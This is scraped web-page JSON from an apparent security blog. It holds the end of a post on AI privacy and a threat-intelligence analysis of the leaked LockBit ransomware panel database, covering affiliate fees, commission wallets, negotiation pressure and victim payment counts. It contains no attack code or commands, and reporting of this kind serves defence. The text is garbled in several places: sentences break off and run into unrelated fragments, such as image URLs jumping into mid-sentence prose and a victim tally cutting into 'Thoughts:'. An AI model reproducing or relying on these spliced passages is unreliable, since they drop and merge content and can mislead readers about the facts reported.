data as possible, especially when planning something like a vacation. Otherwise, you might just find your itinerary showing up in someone else’s AI-generated recommendations in the next version of the model you use.\u0026nbsp;\u003c/p\u003e\u003cp lang=\"EN-US\"\u003eThe future of privacy in AI is not set in stone yet. But one thing is certain: staying informed and cautious is your best defence.\u0026nbsp;\u003c/p\u003e"}],"itemState":"published","timeToRead":"13","translations":[],"originalLanguagePost":{},"mediaType":{"video":false,"audio":false},"socialMediaMetaImage":"https://www.gendigital.com/sites/default/files/styles/social_media_meta/public/2025-07/Stocksy_txpe08a537dYqu300_OriginalDelivery_347002.jpg?h=9da44f55\u0026itok=1IpsYFX7","language":"en","heroImage":{"default":{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_hero_extra_wide/public/2025-07/Stocksy_txpe08a537dYqu300_OriginalDelivery_347002.jpg.webp?itok=wyIHNswN isn't what it used to be, it’s gotten a corporate makeover. What began as a work of lone hackers, has evolved into a sophisticated business model known as Ransomware-as-a-Service (RaaS). In this setup, ransomware developers and a network of affiliates collaborate like any legitimate enterprise (minus the part where they extort people).\u0026nbsp;\u003c/p\u003e\u003cp\u003eUnlike traditional companies, ransomware groups don't publish earning reports or financial disclosures. Their operations are covered in shadows - until something goes wrong. Occasionally, these groups become targets themselves, and when they do, we get a rare glimpse behind the curtain.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis article explores one such moment. On May 7th 2025, arguably the most notorious ransomware group, LockBit, had its panel defaced, exposing a link to a dump of its internal database. The data revealed that the panel had been in operation since at least December 18th, 2024, based on early test entries in the database. While the leak has drawn attention for its technical and operational revelations, this analysis takes a different approach: it focuses on the economic structure behind LockBit's operations. How LockBit recruits affiliates, manages operations, and generates profit. In doing so, we aim to shed light on the inner workings of the underground economy of cybercrime.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eInside the LockBit Panel\u0026nbsp;\u003c/h2\u003e\u003cp\u003eThe leaked database revealed a sophisticated backend system - basically, a control panel for managing a global extortion operation. It included everything from user accounts and victim profiles to ransomware build information and chat messages exchanged between affiliates and victims.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThrough this panel, affiliates had access to generate customized ransomware payloads for different environments such as Windows, Linux, and ESXi. The system also stored detailed information about LockBit's victims (or \"clients\" as they are called internally). Each victim had an assigned public key, responsible affiliate, a payment status, and a complete chat history with the affiliate including features like message read receipts.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eOne particularly eyebrow-rasing detail: affiliate passwords were stored in plaintext. A surprising move for a group that claims to be all about operational control. But hey, even cybercrime syndicates cut corners on cybersecurity.\u0026nbsp;\u003c/p\u003e\u003cp\u003eEssentially, we got a preview of a modern CMR (Customer Relationship Management) system - this time not for selling products or services, but rather for extortion.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-07/lockbit-dump-erd.png.webp?itok=XsZa5cf9 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2025-07/lockbit-dump-erd.png.webp?itok=Vm-OtMgy 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":685},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2025-07/lockbit-dump-erd.png.webp?itok=zWoqbMKA 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2025-07/lockbit-dump-erd.png.webp?itok=xRTe5hZ4 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":521},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-07/lockbit-dump-erd.png.webp?itok=noGYbYcb 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2025-07/lockbit-dump-erd.png.webp?itok=Roix18ht 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":404}],"caption":"Schema of the database and the most interesting attributes","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-07/lockbit-dump-erd.png.webp?itok=noGYbYcb","link":""}]},{"bundle":"rich_text","content":"\u003ch2\u003eA Day in the Life of a LockBit Affiliate\u003c/h2\u003e\u003cp\u003eAffiliates are individuals enrolled in the LockBit's affiliate program, think of them as franchises in the ransomware world. After gaining access to the panel, they are granted permissions to build specific versions of the LockBit ransomware. These builds are then deployed to victim systems, either through self-obtained access or via third-party brokers.\u003c/p\u003e\u003cp\u003eWhen a victim is compromised, they are directed to LockBit's infrastructure, where they land in a private chatroom assigned to the affiliate who infected them. This is where real business begins: negotiation, manipulation and psychological warfare.\u003c/p\u003e\u003cp\u003eWhile affiliates often present themselves as cold and transactional, the chat logs reveal a more manipulative side. Affiliates frequently use everything, from manufactured urgency to subtle threats, designed to wear victims down and push them towards payment.\u003c/p\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-07/LocBit%20Ransomware%20Negotiation%20Transcript%20%281%29.png.webp?itok=BdaY4F8h a ransom is agreed upon, the affiliate generates a new Bitcoin wallet (for our case, we will call it a \u003cem\u003eransom wallet\u003c/em\u003e) to receive the payment. Those wallets are created and controlled by the affiliate, and thus not directly stored in the LockBit panel database. They can be found in the negotiation chats.\u003c/p\u003e\u003cp\u003eAfter receiving the ransom, the affiliate is expected to send 20% of the ransom to a \u003cem\u003ecommission wallet\u003c/em\u003e (a wallet address that is pre-generated and stored in the panel for each affiliate-victim pair). These commission wallets are under LockBit's control and serve as the group's cut of the ransom payments.\u003c/p\u003e\u003cp\u003eThe affiliates' share (80%) is usually moved quickly through additional wallets or cryptomixers (services designed to obscure origin of funds), the commission wallets remain largely untouched. The fee for aspiring affiliates ranges from around $700 to $810. After transferring this fee, LockBit creates a new user in the database and sets them the role of newbie. Then, the affiliate officially gets access to the panel and is able to deploy LockBit ransomware and use their infrastructure for ransom negotiations. Startup costs, criminal edition.\u003c/p\u003e\u003cp\u003eThe dump contained more than 3,600 invitations, with wallets designed to pay the fee either through Bitcoin or Monero. Because of the difficult traceability of the Monero wallets, we cannot say for sure the total number of panel fee payments. But among the invitations that used Bitcoin, only 12 users actually paid the invitation fee during the operation of the panel.\u003c/p\u003e\u003ch3\u003eThe Revenue Picture\u003c/h3\u003e\u003cp\u003eEvery LockBit client has an entry in the panel's table. The group collects data about the victim's website, their expected revenue, whether they are an important client or no or their assigned master public key (the tables in the database also show column for private key, however, it is empty for every victim). Since December 2024, the database contained in total of 246 victims with 208 that actually connected to the dedicated chat and started with the negotations. However, from examining the commission and ransom wallets, only 19 paid the ransom payment. Thoughts: Crime as Business\u003c/h2\u003e\u003cp\u003eLockBit’s panel leak is one of the clearest examples we’ve seen on Ransomware-as-a-Service functioning like a tech startup, except its “value proposition” is fear, pressure and extortion.\u003c/p\u003e\u003cp\u003eThe business was powered by a surprisingly systematic affiliate model, built-in infrastructure, and financial incentives. Despite the flood of invitations and flashy promises, the majority of affiliates never got paid. Of the 246 victims listed, just 19 were paid, suggesting most people either lacked the funds or simply refused to play along. If this all sounds like a parody of a VC-backed startup pitch, it kind of is. But the impact is real, and the profits (while smaller than the headlines suggest) are still enough to fund the next wave of extortion innovation.\u003c/p\u003e\u003cp\u003eFor readers interested in a
